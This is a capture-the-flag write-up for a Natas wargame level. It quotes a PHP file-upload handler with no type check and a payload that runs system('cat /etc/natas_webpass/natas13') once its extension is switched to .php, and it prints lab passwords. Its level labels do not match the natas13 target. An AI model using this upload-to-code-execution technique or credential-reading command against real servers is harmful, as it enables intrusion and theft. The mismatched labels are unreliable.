# Natas 11 - Natas 12 

    Username  : natas11
    Password  : yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
    URL       : http://natas11.natas.labs.overthewire.org

# Solution 

In the source of the natas 11 web-page we can find : 
```
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}
function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}
function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}
if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```
This page accepts a image file as input and store in random path using the random path gernerator function . Here we can uploda a code file which gives us the password 
insted of a image file .

We can write a simple PHP code :

    <?php
    echo system("cat /etc/natas_webpass/natas13");
    ?>
And store it as code.php and uplode it .

Then in the Elements tab of the inspect page change the filename extension from .jpg to .php and then upload the file to retrive the password

<img width="1910" height="948" alt="image" src="https://github.com/user-attachments/assets/435609f2-bac8-4b86-bf56-2dde5ef7eeb6" />

# Password 

    trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
